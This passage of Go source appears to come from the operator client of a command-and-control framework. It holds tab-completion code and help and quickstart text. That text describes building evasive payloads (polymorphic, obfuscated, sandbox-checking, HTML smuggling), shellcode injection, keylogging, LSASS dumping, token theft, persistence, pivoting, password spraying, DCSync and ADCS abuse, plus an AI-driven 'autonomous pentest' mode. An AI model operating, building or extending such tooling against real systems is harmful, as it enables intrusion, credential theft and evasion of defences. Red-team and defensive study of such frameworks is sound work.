		if strings.HasPrefix(lw, "--") || (strings.HasSuffix(line, " ") && len(parts) >= 1) {
			return filterPrefix([]string{"--ai"}, lw)
		}

	case "certipy":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(certipySubcmds, lastWord(parts, line))
		}
		// shadow action completion
		if len(parts) >= 2 && parts[1] == "shadow" {
			if len(parts) == 2 || (len(parts) == 3 && !strings.HasSuffix(line, " ")) {
				return filterPrefix([]string{"list", "add", "remove", "clear", "info", "auto"}, lastWord(parts, line))
			}
		}
		// pfx file completion
		lw := lastWord(parts, line)
		prev := ""
		if len(parts) >= 2 {
			prev = parts[len(parts)-1]
		}
		if strings.HasSuffix(line, " ") && len(parts) >= 1 {
			prev = parts[len(parts)-1]
		}
		if prev == "-pfx" || prev == "-ca-pfx" {
			return fileCompletions(lw)
		}

	case "describeticket", "ticketconverter":
		return fileCompletions(lastWord(parts, line))

	case "ntlmrelayx":
		lw := lastWord(parts, line)
		prev := ""
		if len(parts) >= 2 {
			prev = parts[len(parts)-1]
		}
		if strings.HasSuffix(line, " ") && len(parts) >= 1 {
			prev = parts[len(parts)-1]
		}
		if prev == "-tf" {
			return fileCompletions(lw)
		}

	case "cred":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(credSubcmds, lastWord(parts, line))
		}
		if len(parts) >= 2 && parts[1] == "import" {
			return fileCompletions(lastWord(parts, line))
		}

	case "role":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(roleSubcmds, lastWord(parts, line))
		}
		if len(parts) >= 2 && parts[1] == "set" {
			if len(parts) == 3 || (len(parts) == 4 && !strings.HasSuffix(line, " ")) {
				return filterPrefix(roleNames, lastWord(parts, line))
			}
		}

	case "persist":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix([]string{"registry", "schtask", "startup", "service", "wmi",
				"crontab", "bashrc", "rc.local", "systemd"}, lastWord(parts, line))
		}

	case "forkrun", "inject-apc", "dotnet-asm":
		return fileCompletions(lastWord(parts, line))

	case "keylog":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix([]string{"start", "stop", "dump"}, lastWord(parts, line))
		}

	case "link":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix([]string{"start", "stop"}, lastWord(parts, line))
		}

	case "rsocks":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix([]string{"start", "stop"}, lastWord(parts, line))
		}

	case "httpivot":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix([]string{"start", "stop"}, lastWord(parts, line))
		}

	case "winrm":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix([]string{"exec", "deploy"}, lastWord(parts, line))
		}

	case "portfwd":
		if len(parts) >= 2 && parts[1] == "add" {
			if len(parts) == 3 || (len(parts) == 4 && !strings.HasSuffix(line, " ")) {
				return filterPrefix([]string{"tcp", "udp"}, lastWord(parts, line))
			}
		}

	case "minidump":
		// No completion needed — optional PID argument

	case "port-scan":
		// No completion for target/ports — free-form
	}
	return nil
}

func (cl *CLI) agentIDs() []string {
	raw, err := cl.c.Agents()
	if err != nil {
		return nil
	}
	var agents []*server.Agent
	if err := json.Unmarshal(raw, &agents); err != nil {
		return nil
	}
	ids := make([]string, 0, len(agents))
	for _, a := range agents {
		ids = append(ids, a.ID[:8])
	}
	return ids
}

func (cl *CLI) updatePrompt() {
	if cl.current == "" {
		cl.rl.SetPrompt(cBGreen + "c2" + cReset + " " + cBWhite + ">" + cReset + " ")
	} else {
		id := cl.current
		if len(id) > 8 {
			id = id[:8]
		}
		cl.rl.SetPrompt(cBGreen + "c2" + cReset + " (" + cBYellow + id + cReset + ") " + cBWhite + ">" + cReset + " ")
	}
}

func (cl *CLI) requireAgent() {
	if cl.current == "" {
		warn("no agent selected — use %suse <id>%s", cBCyan, cReset)
	}
}

// ── utilities ─────────────────────────────────────────────────────────────

func fileCompletions(prefix string) []string {
	dir := filepath.Dir(prefix)
	if dir == "" {
		dir = "."
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	base := filepath.Base(prefix)
	var out []string
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), base) {
			p := filepath.Join(dir, e.Name())
			if e.IsDir() {
				p += "/"
			}
			out = append(out, p)
		}
	}
	return out
}

func filterPrefix(list []string, prefix string) []string {
	var out []string
	for _, s := range list {
		if strings.HasPrefix(s, prefix) {
			out = append(out, s)
		}
	}
	return out
}

func lastWord(parts []string, line string) string {
	if strings.HasSuffix(line, " ") || len(parts) == 0 {
		return ""
	}
	return parts[len(parts)-1]
}

func ago(t time.Time) string {
	d := time.Since(t)
	switch {
	case d < time.Minute:
		return fmt.Sprintf("%ds ago", int(d.Seconds()))
	case d < time.Hour:
		return fmt.Sprintf("%dm ago", int(d.Minutes()))
	default:
		return fmt.Sprintf("%dh ago", int(d.Hours()))
	}
}

func printHelp() {
	const b = cBGreen // section header = bold green
	const r = cReset
	fmt.Printf(`
%sSERVER%s
  agents                             list agents / agents del <id>
  use <id>                           select agent  [TAB completes]
  back                               deselect agent
  kill [id]                          send KILL to agent
  jobs                               active listeners
  plugins list                       list community modules
  plugins reload                     rediscover installed modules
  plugins run <id> [json]            run a read-only module
  plugins runs <id> [limit]          execution history
  listener start http|mtls|tcp <port> start HTTP/mTLS/TCP raw listener
  listener start dns <port> <domain> start DNS listener
  listener start wstunnel <port>     WS bridge → operator port
  listener stop <id>                 stop listener
  build http|mtls|dns <host> [opts]  compile payload
  gencert <label>                    agent mTLS cert
  operators                          connected operators
  chat                               operator chat
  role list / role set <op> <role>   role management
  report [--ai]                      HTML report + MITRE ATT&CK
  help start                         quick-start guide

%sAGENT%s  (requires: use <id>)
  info                               agent details
  shell <cmd>                        run shell command
  sleep <sec> <jitter%%>              change beacon interval
  results [n]                        result history
  cleanup                            self-delete from system

%sFILESYSTEM%s
  pwd / cd / ls / mkdir / rm / cat / env

%sTRANSFER%s
  download <remote_path>             agent → server
  upload <local> <remote_path>       server → agent

%sPOST-EXPLOITATION%s
  ps                                 list processes
  screenshot                         capture → server
  inject <pid> <sc.bin>              remote injection
  inject-apc <sc.bin> [proc]         APC early-bird (evasive)
  dotnet-asm <asm.exe> [proc]        .NET assembly in memory
  forkrun <sc.bin> [proc]            shellcode in sacrificial process
  stage2 <sc.bin>                    handoff to Sliver/CS/Havoc
  bof <name|file.o> [args]           run BOF
  bof list / bof install             list / download collections
  token whoami|steal <pid>|make <u> <p>|drop
  keylog start|stop|dump             keylogger WH_KEYBOARD_LL
  clip                               read clipboard
  minidump [pid]                     dump lsass → .dmp
  port-scan <target> <ports> [ms]    TCP scan from agent
  persist <method> <cmd> [name]
    Windows: registry|schtask|startup|service|wmi
    Linux:   crontab|bashrc|rc.local|systemd

%sPIVOT%s
  socks <port> [user:pass]           direct SOCKS5
  socks stop
  rsocks start [port] [user:pass]    Reverse SOCKS5 (bypasses NAT)
  rsocks stop
  portfwd add [tcp|udp] <lp> <rh> <rp>
  portfwd del [tcp|udp] <lport> / portfwd list
  link start [pipename] / link stop  named pipe SMB (P2P)
  httpivot start [port] / httpivot stop
  winrm exec  <t> <u> <p> <cmd>     execute via WinRM
  winrm deploy <t> <u> <p> <cradle> deploy remote agent

%sLOCAL TOOLS%s
  !<cmd>                             run on Kali
  setup                              check tools
  scan <target> [-p ports]           nmap
  enum <target> [-u u -p p]          nxc SMB/LDAP
  spray <target> -u list -p pass     password spray
  asrep <target> -d dom -u list      AS-REP Roasting
  secretsdump <target> -u u -p p     NTDS/SAM (DCSync)
  bloodhound <target> -d dom -u u -p p
  kerbrute enum|brute|spray -d dom --dc <target> <wordlist>

%sIMPACKET%s
  Remote execution:
    wmiexec / psexec / smbexec / dcomexec / atexec
    → <t> -u u [-p p] [-d d] [-H h] [cmd]

  Kerberos:
    kerberoast  <t> -d d -u u [-p p] [-H h]
    gettgt      <t> -d d -u u [-p p] [-H h]
    getst       <t> -d d -u u -spn <spn> [-impersonate u]
    describeticket <t.ccache>  /  ticketconverter <in> <out>

  AD/SMB enumeration:
    lookupsid / samrdump / rpcdump / dumpntlminfo
    getadusers / getadcomputers / finddelegation
    getlaps / getgpp
    → <t> -d d -u u [-p p]

  Network and services:
    mssqlclient / smbclient / smbserver / ntlmrelayx

  AD escalation / DACL:
    dacledit / rbcd / addcomputer / changepasswd / dpapi
    → <t> -d d -u u -action read|write [opts]

  Passthrough:
    impacket <tool> [args...]   TAB completes 50+ names

%sCERTIPY (ADCS)%s
  certipy find   <dc-ip> -u u@d [-p p] [-vulnerable]
  certipy req    <target> -u u@d -ca <CA> [-template t] [-upn u]
  certipy auth   -pfx <file> [-dc-ip ip]
  certipy ca     <target> -u u@d -ca <CA> [opts]
  certipy shadow <target> -u u@d [-account v] <list|add|auto>
  certipy relay  -target http|rpc://<ca> [-upn u]
  certipy forge  [-ca-pfx ca.pfx] -upn upn@domain
  certipy template|account|cert|parse [args...]

%sCREDENTIALS%s
  cred list [-q filter]
  cred add -u user -s secret [-t type] [-d dom] [-H host]
  cred del <id>  /  cred import <file>  /  cred dump
  types: plaintext | ntlm | krb5 | certificate

%sAI (Ollama)%s
  ai chat [-m model] [-url url]      interactive chat
  ai auto <target> -d <domain>       autonomous pentest

%sWEB GUI%s
  gui start <port>                   start web interface at 127.0.0.1:port
  gui stop                           stop web interface
  gui status                         show port and URL with token
  (when launching client: -gui-port <p> [-gui-only])

  help start  →  quick-start guide
  impacket <name> --help  →  tool-specific help

`, b, r, b, r, b, r, b, r, b, r, b, r, b, r, b, r, b, r, b, r, b, r, b, r)
}

func printQuickstart() {
	fmt.Print(`
┌─────────────────────────────────────────────────────────────────┐
│                  C2 — QUICKSTART                    │
└─────────────────────────────────────────────────────────────────┘

ON THE SERVER (once):
  $ go build -o bin/c2-server ./cmd/server/
  $ ./bin/c2-server

ON THE VPS (admin generates profiles out-of-band):
  $ c2-server new-operator -name alice
    → generates alice.json (SSH tunnel)
  $ c2-server new-operator -name alice -via-ws wss://xxx.trycloudflare.com/ws
    → generates alice.json with WS tunnel pre-configured

OPTION A — SSH tunnel (no Cloudflare):
  1. On the operator:  ssh -L 31337:127.0.0.1:31337 user@<vps> -N &
  2. Connect:          c2-client -profile alice.json

OPTION B — Cloudflare Tunnel (no SSH, from any network):
  1. On the VPS:
     listener start wstunnel 40000         ← in the C2 client
     cloudflared tunnel --url http://127.0.0.1:40000 --no-autoupdate
     c2-server new-operator -name alice -via-ws wss://<uuid>.trycloudflare.com/ws

  2. On the operator:
     c2-client -profile alice.json    ← WS URL already embedded

OPERATE:
  c2> build http 192.168.1.10                    ← exe + shellcode
  c2> build mtls 10.0.0.1 60 20 garble sandbox  ← obfuscated + checks
  c2> build http 10.0.0.1 60 20 format=html     ← html smuggling
  c2> build http 10.0.0.1 60 20 format=dll inject=fiber
  c2> build http 10.0.0.1 60 20 encrypt=aes kill-date=2026-12-31
  c2> build http 10.0.0.1 60 20 encrypt=poly            ← polymorphic stub, different signature each build
  c2> build http 10.0.0.1 60 20 os=linux arch=arm64
  c2> build http 10.0.0.1 60 20 user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" beacon-uris=/search,/api/v1/data
  c2> build http 10.0.0.1 60 20 proxy=http://corp-proxy:8080 working-hours=09:00-17:00
  c2> build http 10.0.0.1 60 20 http-headers="X-Cache-ID:abc;Cookie:session=xyz"
  c2> jobs                                       ← view listeners
  c2> agents                                     ← view agents
  c2> use <TAB>                                  ← select agent
  c2 [abc12345]> shell whoami
  c2 [abc12345]> ps
  c2 [abc12345]> screenshot
  c2 [abc12345]> token steal 1234
  c2 [abc12345]> socks 1080
  c2 [abc12345]> portfwd add 4444 10.10.10.5 445
  c2 [abc12345]> inject 4321 /tmp/sliver.bin
  c2 [abc12345]> stage2 /tmp/sliver.bin
  c2 [abc12345]> cleanup

`)
}
